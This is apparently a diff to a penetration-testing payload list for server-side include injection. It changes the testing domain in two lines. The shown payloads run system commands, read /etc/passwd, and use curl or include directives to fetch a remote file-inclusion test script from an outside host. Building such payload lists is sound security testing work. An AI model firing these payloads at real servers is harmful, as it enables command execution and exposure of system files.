@@ -61,7 +61,7 @@
 <!--#exec cmd="/bin/ls /" -->
 <!--#exec cmd="cat /etc/passwd" -->
 <!--#exec cmd="cd C:\WINDOWS\System32">
-<!--#exec cmd="curl http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#exec cmd="curl http://sn1persecurity.com/.testing/rfi_vuln.php" -->
 <!--#exec cmd="dir" -->
 <!--#exec cmd="ipconfig" -->
 <!--#exec cmd="ls" -->
@@ -77,7 +77,7 @@
 <!--#include file=?UUUUUUUU...UU?-->
 <!--#include virtual="/" -->
 <!--#include virtual="/index.html" -->
-<!--#include virtual="http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#include virtual="http://sn1persecurity.com/.testing/rfi_vuln.php" -->
 <!--#include virtual="https://crowdshield.com/.testing/rfi_vuln.php" -->
 <!--#printenv -->
 </nowiki>
